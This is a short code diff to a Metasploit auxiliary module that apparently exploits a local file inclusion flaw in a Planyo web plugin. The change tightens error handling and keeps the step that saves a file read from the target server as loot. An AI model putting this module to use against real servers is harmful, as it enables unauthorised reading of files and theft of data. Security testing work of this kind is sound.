@@ -110,21 +110,24 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => "/#{datastore['TARGETURI']}/#{route}/#{datastore['FILEPATH']}"
     }, 25)
 
-    # Show data if needed
-    if res && res.code == 200
-      vprint_line(res.to_s)
-      fname = File.basename(datastore['FILEPATH'])
-
-      path = store_loot(
-        'planyo.http',
-        'application/octet-stream',
-        datastore['RHOST'],
-        res.body,
-        fname
-      )
-      print_status("File saved to: #{path}")
-    else
-      print_error('Nothing was downloaded. Check the file path')
+    unless res
+      fail_with(Failure::Unreachable, 'No response received while attempting LFI')
     end
+    unless res.code == 200
+      fail_with(Failure::UnexpectedReply, "Unexpected HTTP status: #{res.code} while attempting LFI")
+    end
+
+    # Show data if needed
+    vprint_line(res.to_s)
+    fname = File.basename(datastore['FILEPATH'])
+
+    path = store_loot(
+      'planyo.http',
+      'application/octet-stream',
+      datastore['RHOST'],
+      res.body,
+      fname
+    )
+    print_status("File saved to: #{path}")
   end
 end
